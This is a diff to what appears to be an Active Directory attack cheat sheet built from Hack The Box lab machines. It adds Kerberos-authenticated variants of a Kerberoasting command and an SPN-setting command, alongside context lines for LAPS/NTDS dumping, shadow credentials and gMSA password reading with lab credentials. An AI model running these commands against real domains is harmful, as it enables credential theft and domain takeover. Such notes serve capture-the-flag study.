@@ -823,8 +823,10 @@ netexec smb dc01.fluffy.htb -u user.txt -p pass.txt --continue-on-success
 # p.agila can read the LAPS password from the ms-MCS-AdmPwd property  ( p.agila need have   ReadLAPSPassword permission) 
 netexec smb dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --laps --ntds
 
-# Kerberoasting 
-netexec ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --kerberoasting -
+# Kerberoasting ( Kerberoasting with auth kerberoas ) 
+netexec ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --kerberoasting -  
+or 
+netexec ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k --kerberoasting svc_winrm.hash 
 
 # run ADCS modules  
 netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -M adcs
@@ -855,8 +857,10 @@ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
 # adding the p.agila user to the Service Accounts group
 bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
 
-# adding a SPN to alfred to get kerberoas to have a hash  alfred  ( henry need have  WriteSPN to alfred ) 
+# adding a SPN to alfred to get kerberoas to have a hash  alfred  ( henry need have  WriteSPN to alfred )   ( or auth by kerberoas) 
 bloodyAD -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host dc01.tombwatcher.htb set object alfred servicePrincipalName -v 'http/whatever'
+or
+bloodyAD -d tombwatcher.htb -k --host dc01.tombwatcher.htb -p 'H3nry_987TGV!' set object svc_winrm servicePrincipalName -v 'http/whatever' 
 
 # alfred have ReadGMSAPassword permission can reed password of machine account 'ANSIBLE_DEV$'
 bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
